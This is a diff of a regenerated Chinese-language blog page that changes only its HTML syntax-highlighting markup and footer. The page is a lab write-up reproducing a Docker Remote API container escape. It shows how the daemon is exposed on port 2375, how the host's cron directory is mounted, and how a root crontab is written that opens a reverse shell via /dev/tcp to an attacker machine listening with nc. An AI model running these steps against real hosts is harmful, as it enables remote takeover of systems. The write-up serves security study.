@@ -173,11 +173,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">lzy@zyUb:~$ sudo nano /lib/systemd/system/docker.service
-<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> lzy: 
-lzy@zyUb:~$ sudo systemctl daemon-reload
-lzy@zyUb:~$ sudo service docker restart
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lzy@zyUb:~$ sudo nano /lib/systemd/system/docker.service
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> lzy: 
+</span></span><span class="line"><span class="cl">lzy@zyUb:~$ sudo systemctl daemon-reload
+</span></span><span class="line"><span class="cl">lzy@zyUb:~$ sudo service docker restart
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行上述命令，在<code>docker.service</code>文件中添加以下红线所标出的内容(<code>-H tcp://0.0.0.0:2375</code>)</p>
 <p><figure><a class="lightgallery" href="/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6.png" title="修改文件" data-thumbnail="/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6.png" data-sub-html="<h2>修改文件</h2><p>修改文件</p>">
@@ -225,13 +225,13 @@ lzy@zyUb:~$ sudo service docker restart
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>lzy㉿kaliForZy<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
-└─$ docker -H tcp://192.168.170.129:2375 images
-REPOSITORY    TAG       IMAGE ID       CREATED         SIZE
-alpine        latest    e50c909a8df2   <span class="m">9</span> days ago      5.61MB
-ubuntu        18.04     c090eaba6b94   <span class="m">2</span> weeks ago     63.3MB
-hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13.3kB
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>lzy㉿kaliForZy<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ docker -H tcp://192.168.170.129:2375 images
+</span></span><span class="line"><span class="cl">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE
+</span></span><span class="line"><span class="cl">alpine        latest    e50c909a8df2   <span class="m">9</span> days ago      5.61MB
+</span></span><span class="line"><span class="cl">ubuntu        18.04     c090eaba6b94   <span class="m">2</span> weeks ago     63.3MB
+</span></span><span class="line"><span class="cl">hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13.3kB
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后创建容器。因为最后反弹shell的实现方式是使用crontab计划任务，所以需要将crontab用到的文件所在路径，也就是宿主机的<code>var/spool/cron</code>目录挂载到容器中。</p>
 <div class="highlight"><div class="chroma">
@@ -240,9 +240,9 @@ hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>lzy㉿kaliForZy<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
-└─$ docker -H tcp://192.168.170.129:2375 run -it -v /var/spool/cron/:/get3cad/ c090 /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>lzy㉿kaliForZy<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ docker -H tcp://192.168.170.129:2375 run -it -v /var/spool/cron/:/get3cad/ c090 /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>ubuntu的crontab相关文件的路径为<code>var/spool/cron/crontabs/root</code>，但是我自己装的虚拟机在该路径下并不存在<code>root</code>文件。所以在进入到容器中后，要切换到相应路径（也可以在创建容器的时候就使用<code>chroot</code>参数），然后创建文件。</p>
 <div class="highlight"><div class="chroma">
@@ -250,8 +250,8 @@ hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@22b103440b66:/get3cad/crontabs# touch root
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@22b103440b66:/get3cad/crontabs# touch root
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要注意，创建的<code>root</code>文件默认是644权限，在crontab执行的时候会被认为是不安全模式。所以需要修改权限为<code>600</code>。</p>
 <p><figure><a class="lightgallery" href="/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/644.png" title="644" data-thumbnail="/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/644.png" data-sub-html="<h2>644</h2><p>644</p>">
@@ -279,8 +279,8 @@ hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@22b103440b66:/get3cad/crontabs# chmod <span class="m">600</span> root
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@22b103440b66:/get3cad/crontabs# chmod <span class="m">600</span> root
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>最后往<code>root</code>文件中写入反弹shell的计划任务。同时，因为sh与bash环境的不同，需要将命令用<code>bash -c</code>包含起来。</p>
 <div class="highlight"><div class="chroma">
@@ -288,8 +288,8 @@ hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@22b103440b66:/get3cad/crontabs# <span class="nb">echo</span> <span class="s1">&#39;* * * * * bash -c &#34;bash -i  &gt;&amp;/dev/tcp/192.168.170.128/7777 0&gt;&amp;1&#34;&#39;</span> &gt;&gt; /get3cad/crontabs/root
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@22b103440b66:/get3cad/crontabs# <span class="nb">echo</span> <span class="s1">&#39;* * * * * bash -c &#34;bash -i  &gt;&amp;/dev/tcp/192.168.170.128/7777 0&gt;&amp;1&#34;&#39;</span> &gt;&gt; /get3cad/crontabs/root
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在攻击者主机中使用nc监听，连接到反弹的shell</p>
 <p><figure><a class="lightgallery" href="/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/shell.png" title="shell" data-thumbnail="/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/shell.png" data-sub-html="<h2>shell</h2><p>shell</p>">
@@ -364,8 +364,8 @@ hello-world   latest    bf756fb1ae65   <span class="m">13</span> months ago   13
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
